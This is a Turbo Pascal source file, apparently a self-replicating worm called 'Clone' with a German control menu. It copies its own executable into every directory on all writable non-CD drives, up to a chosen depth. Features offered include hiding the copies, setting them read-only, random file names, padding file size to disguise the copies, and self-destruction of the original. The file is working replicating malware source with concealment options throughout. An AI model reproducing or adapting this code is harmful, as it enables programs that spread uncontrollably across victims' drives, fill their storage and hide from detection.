PROGRAM Clone;

USES Crt,Dos,RT_Watch;

CONST
  RetryTime = 10;
  FileBufferSize = 32768;

TYPE
  DriveListType = ARRAY[1..26] OF Char;

VAR
  WriteProtection,
  DisguisingMode,
  SelfDestruction,
  FilesizeVeiling,
  IRC_Min,IRC_Max,
  MultipleNames,
  LogFileRecord,
  DriveSpreading,
  LowerDirPorting,
  InfiniteReplication,
  a,b,x,d    : Byte;
  Control    : Integer;
  i,n,
  Year,Mon,
  Day,Week,
  Hour,Min,
  Sek,Sec100,
  FileAttr2  : Word;
  DirDepth,
  Size,
  StartZeit,
  EndZeit,
  Zeit,
  Counter,
  Copie      : LongInt;
  Sec        : Real;
  Input,
  Ch         : Char;
  Path,Dir,
  Name,Ext,
  FullName,
  r,q,temp,
  FileName,
  FileName2,
  List1,
  List2,
  ListEntry2,
  ListEntry,
  DateTime,
  LogFileID,
  abc        : STRING;
  FileHandle : FILE;
  LogFile,
  listfile,
  listfile2,
  listfile3  : Text;
  F          : SearchRec;
  DriveList2 : DriveListType;

PROCEDURE StrUpCase(VAR S : String);
VAR i : Byte;
BEGIN
  FOR i := 1 TO Length(s) DO S[i] := UpCase(S[i]);
END;

PROCEDURE StartTimer;
VAR
  R : Registers;
BEGIN
  R.AH := $00;
  Intr($1A,R);
  StartZeit := R.CX SHL 16+R.DX;
END;

PROCEDURE GetTimer;
VAR
  R : Registers;
BEGIN
  R.AH := $00;
  Intr($1A,R);
  EndZeit := R.CX SHL 16+R.DX;
  Zeit := EndZeit-StartZeit;
  Sec := Zeit/18.2;
END;

FUNCTION GetFileSize(FileName : STRING) : LongInt;
BEGIN
  Assign(FileHandle,FileName);
  Reset(FileHandle,1);
  GetFileSize := FileSize(FileHandle);
  Close(FileHandle);
END;

FUNCTION SetFileAttributes(FileName : STRING; FileAttr : Word) : Boolean;
BEGIN
  Assign(FileHandle,FileName);
  SetFAttr(FileHandle,FileAttr);
  SetFileAttributes := ((IOResult=0) AND (DosError=0));
END;

FUNCTION GetFileAttributes(FileName : STRING; VAR FileAttr : Word) : Boolean;
BEGIN
  Assign(FileHandle,FileName);
  GetFAttr(FileHandle,FileAttr);
  GetFileAttributes := ((IOResult=0) AND (DosError=0));
END;

FUNCTION DeleteFile(FileName : STRING) : Boolean;
VAR
  FileAttr : Word;
BEGIN
  Assign(FileHandle,FileName);
  GetFAttr(FileHandle,FileAttr);
  IF (FileAttr AND ReadOnly) <> 0 THEN SetFAttr(FileHandle,FileAttr AND (NOT ReadOnly));
  Erase(FileHandle);
  DeleteFile := (IOResult=0);
END;

FUNCTION DirExists(DName : STRING) : Boolean;
VAR
 f     : FILE;
 fAttr : Word;
BEGIN
 Assign(f,DName);
 GetFAttr(f,fAttr);
 DirExists := ((fAttr AND Directory) <> 0) AND (DosError = 0);
END;

FUNCTION FileExists(FName : STRING) : Boolean;
VAR
 f     : FILE;
 fAttr : Word;
BEGIN
 Assign(f,FName);
 GetFAttr(f,fAttr);
 FileExists := (DosError = 0)
            AND ((fAttr AND Directory) = 0)
            AND ((fAttr AND VolumeID)  = 0);
END;

FUNCTION FileAccess(FName : STRING) : Boolean;
VAR
 f     : FILE;
 fAttr : Word;
BEGIN
 Assign(f,FName);
 GetFAttr(f,fAttr);
 FileAccess := (DosError = 0) AND (ReadOnly <> 0);
END;

FUNCTION ReadSector(Drive,Head,Track,Sector,TotalSector : Byte; DiskBuffer : Pointer): Byte; ASSEMBLER;
ASM
  mov  cx, RetryTime
@retry:
  push cx
  mov  ah, 02h
  mov  al, TotalSector
  mov  ch, Track
  mov  cl, Sector
  mov  dh, Head
  mov  dl, Drive
  les  bx, DiskBuffer
  int  13h
  pop  cx
  jnc  @finish
  loop @retry
@finish:
  mov  al, ah
END;

FUNCTION GetCMOSFloppyDriveAType : Byte;
VAR
  InValue : Byte;
  DriveA  : Byte;
BEGIN
  INLINE($fa);
  Port[$70] := $10;
  InValue := Port[$71];
  DriveA := (InValue AND $f0) SHR 4;
  GetCMOSFloppyDriveAType := DriveA;
  INLINE($fb);
end;

FUNCTION GetCMOSFloppyDriveBType : Byte;
VAR
  InValue : Byte;
  DriveB  : Byte;
BEGIN
  INLINE($fa);
  Port[$70] := $10;
  InValue := Port[$71];
  DriveB := (InValue AND $f);
  GetCMOSFloppyDriveBType := DriveB;
  INLINE($fb);
END;

FUNCTION GetAllLogicalDrive(VAR DriveList : DriveListType) : Byte;
VAR
  DefaultDrive       : Byte;
  TestDrive,NewDrive : Byte;
  TotalDrive         : Byte;
BEGIN
  ASM
    mov ah, 19h
    int 21h
    mov DefaultDrive, al
  END;
  TotalDrive := 0;
  FOR TestDrive := 0 TO 25 DO BEGIN
    ASM
      mov ah, 0eh
      mov dl, TestDrive
      int 21h
      mov ah, 19h
      int 21h
      mov NewDrive, al
    END;
    IF TestDrive = NewDrive THEN BEGIN
      Inc(TotalDrive);
      DriveList[TotalDrive] := Chr(TestDrive+65);
      IF (TestDrive = 0) AND (GetCMOSFloppyDriveAType = 0) THEN Dec(TotalDrive);
      if (TestDrive = 1) AND (GetCMOSFloppyDriveBType = 0) THEN Dec(TotalDrive);
    END;
  END;
  ASM
    mov ah, 0eh
    mov dl, DefaultDrive
    int 21h
  END;
  GetAllLogicalDrive := TotalDrive;
END;

FUNCTION GetAllRecordableDrive(VAR DriveList : DriveListType) : Byte;
CONST
  SectorBufferSize = 1024;
VAR
  TotalDrive   : Byte;
  SectorBuffer : Pointer;
BEGIN
  FillChar(DriveList,SizeOf(DriveListType),0);
  TotalDrive := 0;
  IF MaxAvail < SectorBufferSize then Exit;
  GetMem(SectorBuffer,SectorBufferSize);
  FOR Counter := 0 TO 3 DO BEGIN
    IF NOT(ReadSector(Counter,0,0,1,1,SectorBuffer) IN [$01..$02,$04,$07,$0a..$0d,$bb,$ff]) THEN BEGIN
      Inc(TotalDrive);
      DriveList[TotalDrive] := Chr(Counter+65);
    END;
  END;
  FOR Counter := $80 TO $80+3 DO BEGIN
    IF NOT(ReadSector(Counter,0,0,1,1,SectorBuffer) IN [$01..$02,$04,$07,$0a..$0d,$bb,$ff]) THEN BEGIN
      Inc(TotalDrive);
      DriveList[TotalDrive] := Chr(Counter-61);
    END;
  END;
  FreeMem(SectorBuffer,SectorBufferSize);
  GetAllRecordableDrive := TotalDrive;
END;

FUNCTION GetTotalHardDisk : Byte; ASSEMBLER;
ASM
  mov ah, 08h
  mov dl, 80h
  int 13h
  jnc @finish
  mov dl, 0ffh
@finish:
  mov al, dl
END;

FUNCTION GetTotalCDROMDrive(VAR FirstDriveLetter : Byte) : Byte;
VAR
  Status : Byte;
  FirstDriveLetterValue : Byte;
BEGIN
  ASM
    mov ax, 1500h
    xor bx, bx
    int 2fh
    mov WORD PTR FirstDriveLetterValue, cx
    mov WORD PTR Status, bx
  END;
  FirstDriveLetter := FirstDriveLetterValue;
  GetTotalCDROMDrive := Status;
END;

FUNCTION GetCDROMDrive : Byte; ASSEMBLER;
VAR Drive : Word;
ASM
  mov ax,1500h
  mov bx,0000h
  int 2Fh
  mov drive,cx
  cmp bx,0
  jnz @incdrive
  mov ax,0
  jmp @ende
@incdrive:
  inc drive
  mov ax,drive
@ende:
END;

FUNCTION Is_CDROM(Drv : Char) : Boolean;
VAR
  R   : Registers;
  CDR : STRING;
  cnt : Byte;
BEGIN
  Is_CDROM := False;
  CDR := '';
  WITH R DO BEGIN
    AX := $1500;
    BX := $0000;
    CX := $0000;
    Intr( $2F, R );
    IF BX > 0 THEN BEGIN
      FOR cnt := 0 TO (bx-1) DO CDR := CDR+Char(CL+Byte('A')+cnt);
    END;
    Is_CDROM := Pos(Upcase(Drv),CDR) > 0;
  END
END;

FUNCTION CopyFile(InputFileName,OutputFileName : STRING) : Boolean;
VAR
  InputFile,OutputFile   : FILE;
  ReadStatus,WriteStatus : Word;
  FileBuffer             : Pointer;
  FileDateTime           : Longint;
BEGIN
  CopyFile := False;
  GetFileAttributes(OutputFileName,FileAttr2);
  SetFileAttributes(OutputFileName,0);
  Assign(OutputFile,OutputFileName);
  Rewrite(OutputFile,1);
  CASE FilesizeVeiling OF {kann zusammengefasst werden!!!}
    1 : FOR n := Random(IRC_Min)+1 TO IRC_Min DO FOR i := Random(IRC_Max)+1 TO IRC_Max DO BEGIN
          SetFileAttributes(InputFileName,0);
          Assign(InputFile,InputFileName);
          Reset(InputFile,1);
          IF IOResult <> 0 THEN Exit;
          IF MaxAvail < FileBufferSize THEN Exit;
          GetMem(FileBuffer,FileBufferSize);
          REPEAT
            BlockRead(InputFile,FileBuffer^,SizeOf(FileBuffer),ReadStatus);
            BlockWrite(OutputFile,FileBuffer^,ReadStatus,WriteStatus);
          UNTIL (ReadStatus = 0) OR (WriteStatus <> ReadStatus);
          FreeMem(FileBuffer,FileBufferSize);
          Close(InputFile);
          Size := Size+GetFileSize(Filename);
        END;
    2 : BEGIN
          SetFileAttributes(InputFileName,0);
          Assign(InputFile,InputFileName);
          Reset(InputFile,1);
          IF IOResult <> 0 THEN Exit;
          IF MaxAvail < FileBufferSize THEN Exit;
          GetMem(FileBuffer,FileBufferSize);
          REPEAT
            BlockRead(InputFile,FileBuffer^,SizeOf(FileBuffer),ReadStatus);
            BlockWrite(OutputFile,FileBuffer^,ReadStatus,WriteStatus);
          UNTIL (ReadStatus = 0) OR (WriteStatus <> ReadStatus);
          FreeMem(FileBuffer,FileBufferSize);
          Close(InputFile);
          Size := Size+GetFileSize(Filename);
        END;
    3 : IF Random(2) = 0 THEN FOR i := 1 TO Random(10)+1 DO BEGIN
          SetFileAttributes(InputFileName,0);
          Assign(InputFile,InputFileName);
          Reset(InputFile,1);
          IF IOResult <> 0 THEN Exit;
          IF MaxAvail < FileBufferSize THEN Exit;
          GetMem(FileBuffer,FileBufferSize);
          REPEAT
            BlockRead(InputFile,FileBuffer^,SizeOf(FileBuffer),ReadStatus);
            BlockWrite(OutputFile,FileBuffer^,ReadStatus,WriteStatus);
          UNTIL (ReadStatus = 0) OR (WriteStatus <> ReadStatus);
          FreeMem(FileBuffer,FileBufferSize);
          Close(InputFile);
          Size := Size+GetFileSize(Filename);
        END;
  END;
  GetFTime(InputFile,FileDateTime);
  SetFTime(OutputFile,FileDateTime);
  Close(OutputFile);
  SetFileAttributes(OutputFileName,FileAttr2);
  FileAttr2 := 0;
  CASE WriteProtection OF
    1 : FileAttr2 := FileAttr2 + ReadOnly;
    2 : FileAttr2 := FileAttr2;
    3 : IF Random(2) = 0 THEN FileAttr2 := FileAttr2 + ReadOnly;
  END;
  CASE DisguisingMode OF
    1 : FileAttr2 := FileAttr2 + Hidden;
    2 : FileAttr2 := FileAttr2;
    3 : IF Random(2) = 0 THEN FileAttr2 := FileAttr2 + Hidden;
  END;
  SetFileAttributes(OutputFileName,FileAttr2);
  CopyFile := True;
END;

PROCEDURE GetFileName;
BEGIN
  q := '';
  r := ParamStr(0);
  a := 0;
  b := Length(ParamStr(0));
  REPEAT
    Inc(a);
    q := q+r[b];
    Dec(b);
  UNTIL r[b] = '\';
  b := Length(q);
  r := q;
  FOR i := 1 TO b DO BEGIN
    q[(b+1)-i] := r[i];
  END;
  FileName := q;
END;

PROCEDURE Process(dir : DirStr; s : SearchRec; List : STRING);
BEGIN
  IF (DirExists(dir+s.name) OR FileExists(dir+s.name) OR (FileAccess(dir+s.name) <> False)) THEN BEGIN
    ListEntry2 := dir+s.name;
    IF (ListEntry2[Length(ListEntry2)] <> '.')
      AND ((ListEntry2[Length(ListEntry2)-1] <> '.') OR ((ListEntry2[Length(ListEntry2)-1] <> '\'))) THEN BEGIN
      GotoXY(1,1);
      Write('                                                                            ');
      GotoXY(1,1);
      Write(dir, s.name);
      Assign(listfile3,List);
      Append(listfile3);
      WriteLn(listfile3,dir,s.name);
      GetFilename;
      Filename2 := '';
      FOR i := 1 TO Random(7)+1 DO BEGIN
        IF Random(2) = 0 THEN Filename2 := Filename2+Char(Random(24)+97)
        ELSE IF Random(2) = 1 THEN BEGIN
          Filename2 := Filename2+Char(Random(9)+48);
        END ELSE IF Random(2) = 2 THEN BEGIN
          Filename2 := Filename2+Char(Random(24)+65);
        END ELSE Filename2 := Filename2+Char(Random(24)+65);
      END;
      Filename2 := Filename2+'.EXE';
      CASE MultipleNames OF
        1 : r := dir+s.name+'\'+Filename2;
        2 : r := dir+s.name+'\'+Filename;
        3 : IF Random(2) = 0 THEN r := dir+s.name+'\'+Filename ELSE r := dir+s.name+'\'+Filename2;
      END;
      IF LogFileRecord = 1 THEN BEGIN
        GetDate(Year,Mon,Day,Week);
        GetTime(Hour,Min,Sek,Sec100);
        Assign(LogFile,LogFileID+'.lst');
        Append(LogFile);
        WriteLn(LogFile,Year,'-',Mon,'-',Day,' ',Hour,':',Min,':',Sek,' ::id path:: "',r,'"');
        Close(LogFile);
      END;
      CopyFile(Filename,r);
      Close(listfile3);
      Copie := Copie+1;
      GotoXY(1,2);
      Write('Kopien erstellt: ',copie);
      GotoXY(1,3);
      Write('Verzeichnistiefe: ',DirDepth);
      GotoXY(1,4);
      Write('Speicher: ',(Size/1024/1024):0:4,' MB');
      GetTimer;
      GotoXY(1,5);
      Write('Laufzeit: ',Sec:0:2,' Sekunden');
      GotoXY(1,6);
      Write('Kopien pro Sekunde : ',(copie/(Sec)):0:2);
    END;
  END ELSE BEGIN
    CASE SelfDestruction OF
      1 : FOR i := 1 TO Random(255) DO BEGIN
            SetFileAttributes(Filename,0);
            Assign(ListFile,Filename);
            Rewrite(ListFile);
            Close(ListFile);
            DeleteFile(FileName);
          END;
      3 : IF Random(2) = 0 THEN FOR i := 1 TO Random(255) DO BEGIN
            SetFileAttributes(Filename,0);
            Assign(ListFile,Filename);
            Rewrite(ListFile);
            Close(ListFile);
            DeleteFile(FileName);
          END;
    END;
    FOR i := 1 TO Counter+1 DO BEGIN
      Str(i,abc);
      IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
    END;
  END;
END;

PROCEDURE SearchDir(Path : PathStr; fspec : STRING);
VAR
  f : SearchRec;
BEGIN
  FindFirst(Path+fspec,Directory,f);
  WHILE DosError = 0 DO BEGIN
    IF (f.Attr AND Directory = Directory) THEN BEGIN
      IF LogFileRecord = 1 THEN BEGIN
        GetDate(Year,Mon,Day,Week);
        GetTime(Hour,Min,Sek,Sec100);
        Assign(LogFile,LogFileID+'.lst');
        Append(LogFile);
        WriteLn(LogFile,Year,'-',Mon,'-',Day,' ',Hour,':',Min,':',Sek,' ::copy to:: "',path,f.name,'"');
        Close(LogFile);
      END;
      Process(path,f,List1);
    END;
    Findnext(f);
  END;
END;

BEGIN
  WriteProtection := 3;
  DisguisingMode := 3;
  SelfDestruction := 3;
  FilesizeVeiling := 3;
  MultipleNames := 2;
  LogFileRecord := 2;
  DriveSpreading := 1;
  LowerDirPorting := 2;
  InfiniteReplication := 2;
  Randomize;
  ClrScr;
  IF ParamStr(1) <> '' THEN BEGIN
    temp := ParamStr(1);
    FOR a := 1 TO Length(temp) DO temp[a] := UpCase(temp[a]);
    WriteLn(' Kontrollzentrum von JVN10');
    WriteLn('---------------------------');
    WriteLn;WriteLn;
    WriteLn('  * WRITE PROTECTION');
    WriteLn('    Schreibschutz der Datei setzen?');
    Write('    Eingabe (0=Exit / 1=ja / 2=nein / 3=Zufall): ');
    REPEAT
      Input := ReadKey;
    UNTIL Input IN ['0','1','2','3'];
    Val(Input,WriteProtection,Control);
    IF WriteProtection = 0 THEN Halt(0);
    Write(WriteProtection);
    WriteLn;
    WriteLn;
    WriteLn('  * DISGUISING MODE');
    WriteLn('    Datei verstecken?');
    Write('    Eingabe (0=Exit / 1=ja / 2=nein / 3=Zufall): ');
    REPEAT
      Input := ReadKey;
    UNTIL Input IN ['0','1','2','3'];
    Val(Input,DisguisingMode,Control);
    IF DisguisingMode = 0 THEN Halt(0);
    Write(DisguisingMode);
    WriteLn;
    WriteLn;
    WriteLn('  * SELF DESTRUCTION');
    WriteLn('    Selbszerst”rung nach erfolgreicher Durchfhrung?');
    Write('    Eingabe (0=Exit / 1=ja / 2=nein / 3=Zufall): ');
    REPEAT
      Input := ReadKey;
    UNTIL Input IN ['0','1','2','3'];
    Val(Input,SelfDestruction,Control);
    IF SelfDestruction = 0 THEN Halt(0);
    Write(SelfDestruction);
    WriteLn;
    WriteLn;
    WriteLn('  * FILESIZE VEILING (+ INCREASE RATE CONTROL)');
    WriteLn('    Vergr”sserung der Datei-Gr”sse?');
    Write('    Eingabe (0=Exit / 1=ja / 2=nein / 3=Zufall): ');
    REPEAT
      Input := ReadKey;
    UNTIL Input IN ['0','1','2','3'];
    Val(Input,FilesizeVeiling,Control);
    IF FilesizeVeiling = 0 THEN Halt(0);
    Write(FilesizeVeiling);
    IF FilesizeVeiling = 1 THEN BEGIN
      WriteLn;
      Write('    Minimum: ');
      ReadLn(IRC_Min);
      Write('    Maximum: ');
      ReadLn(IRC_Max);
      IF IRC_Min > IRC_Max THEN BEGIN
        IRC_Min := 1;
        IRC_Max := Random(10)+1;
      END;
      IF IRC_Min <= 0 THEN IRC_Min := 1;
      IF IRC_Max <= 0 THEN IRC_Max := Random(10)+1;;
    END;
    WriteLn;
    WriteLn('  * MULTIPLE NAMES');
    WriteLn('    Mehrfachbennung fr Individalit„t?');
    Write('    Eingabe (0=Exit / 1=ja / 2=nein / 3=Zufall): ');
    REPEAT
      Input := ReadKey;
    UNTIL Input IN ['0','1','2','3'];
    Val(Input,MultipleNames,Control);
    IF MultipleNames = 0 THEN Halt(0);
    Write(MultipleNames);
    WriteLn;
    WriteLn;
    WriteLn('  * LOWER DIRECTORY PORTING');
    WriteLn('    Bis in welche Verzeichnis-Tiefe soll kopiert werden?');
    Write('    Tiefe: ');
    ReadLn(LowerDirPorting);
    IF LowerDirPorting = 0 THEN Halt(0);
    Write(LowerDirPorting);
    IF LowerDirPorting < 1 THEN LowerDirPorting := 2;
    WriteLn;
    WriteLn('  * DRIVE SPREADING');
    WriteLn('    šbergreifen auf andere schreibbare Laufwerke?');
    Write('    Eingabe (0=Exit / 1=ja / 2=nein): ');
    REPEAT
      Input := ReadKey;
    UNTIL Input IN ['0','1','2','3'];
    Val(Input,DriveSpreading,Control);
    IF DriveSpreading = 0 THEN Halt(0);
    Write(DriveSpreading);
{    WriteLn;
    WriteLn;
    WriteLn('  * INFINITE REPLICATION');
    WriteLn('    Endlos wiederholende Verbreitung?');
    Write('    Eingabe (0=Exit / 1=ja / 2=nein): ');
    REPEAT
      Input := ReadKey;
    UNTIL Input IN ['0','1','2','3'];
    Val(Input,InfiniteReplication,Control);
    IF InfiniteReplication = 0 THEN Halt(0);
    Write(InfiniteReplication);
}
    WriteLn;
    WriteLn;
    WriteLn('  * LOG FILE RECORD');
    WriteLn('    Logbuch fhren?');
    Write('    Eingabe (0=Exit / 1=ja / 2=nein): ');
    REPEAT
      Input := ReadKey;
    UNTIL Input IN ['0','1','2','3'];
    Val(Input,LogFileRecord,Control);
    IF LogFileRecord = 0 THEN Halt(0);
    Write(LogFileRecord);
    IF LogFileRecord = 1 THEN BEGIN
      GetDate(Year,Mon,Day,Week);
      Str(Year,temp);
      DateTime := DateTime+temp;
      Str(Mon,temp);
      DateTime := DateTime+temp;
      Str(Day,temp);
      DateTime := DateTime+temp;
      LogFileID := DateTime;
      WriteLn('    Log File ID: ',LogFileID);
      Assign(LogFile,LogFileID+'.lst');
      Rewrite(LogFile);
      Close(LogFile);
    END;
    ReadKey;
    ClrScr;
  END;
{  REPEAT}
    StartTimer;
    d := 0;
    d := GetCDROMDrive-1;{! -1 ?}
    GetAllLogicalDrive(DriveList2);
    Counter := 0;
    REPEAT
      Inc(counter);
    UNTIL DriveList2[counter] = Chr(0);
    Copie := 0;
    Counter := 1;
    DirDepth := Counter;
    Str(counter,abc);
    List1 := abc+'.lst';
    Assign(listfile,List1);
    Rewrite(listfile);
    Close(listfile);
    IF LogFileRecord = 1 THEN BEGIN
      GetDate(Year,Mon,Day,Week);
      GetTime(Hour,Min,Sek,Sec100);
      Assign(LogFile,LogFileID+'.lst');
      Append(LogFile);
      Write(LogFile,Year,'-',Mon,'-',Day,' ',Hour,':',Min,':',Sek,' ::get drives:: "');
      x := 0;
      REPEAT
        Inc(x);
        IF IS_CDROM(DriveList2[x]) = False THEN Write(LogFile,DriveList2[x]);
      UNTIL DriveList2[x] = Chr(0);
      WriteLn(LogFile,'"');
      Close(LogFile);
    END;
    x := 0;
    IF DriveSpreading = 2 THEN SearchDir(DriveList2[x]+':'+'\','*.*') ELSE REPEAT
      IF IS_CDROM(DriveList2[x]) = False THEN SearchDir(DriveList2[x]+':'+'\','*.*');
      Inc(x);
    UNTIL DriveList2[x] = Chr(0);
    REPEAT
      DirDepth := Counter+1;
      Str(counter-1,abc);
      IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
      Str(counter,abc);
      IF FileExists(abc+'.lst') = True THEN BEGIN
        Str(counter,abc);
        List2 := abc+'.lst';
        Assign(listfile2,List2);
        Reset(listfile2);
        Str(counter+1,abc);
        List1 := abc+'.lst';
        Assign(listfile,List1);
        Rewrite(listfile);
        Close(listfile);
        REPEAT
          Read(listfile2,ListEntry);
          ReadLn(listfile2);
          IF (ListEntry[Length(ListEntry)] <> '.')
            AND ((ListEntry[Length(ListEntry)-1] <> '.') OR ((ListEntry[Length(ListEntry)-1] <> '\')))
            THEN SearchDir(ListEntry+'\','*.*');
        UNTIL EoF(listfile2);
        Close(listfile2);
        Inc(counter);
        Str(counter,abc);
      END;
    UNTIL (FileExists(abc+'.lst') <> True) OR (Counter = LowerDirPorting);
    Str(counter-1,abc);
    IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
    Str(counter,abc);
    IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
    Str(counter+1,abc);
    IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
{  UNTIL InfiniteReplication = 2;}
  CASE SelfDestruction OF
    1 : FOR i := 1 TO Random(255) DO BEGIN
          SetFileAttributes(Filename,0);
          Assign(ListFile,Filename);
          Rewrite(ListFile);
          Close(ListFile);
          DeleteFile(FileName);
        END;
    3 : IF Random(2) = 0 THEN FOR i := 1 TO Random(255) DO BEGIN
          SetFileAttributes(Filename,0);
          Assign(ListFile,Filename);
          Rewrite(ListFile);
          Close(ListFile);
          DeleteFile(FileName);
        END;
  END;
END.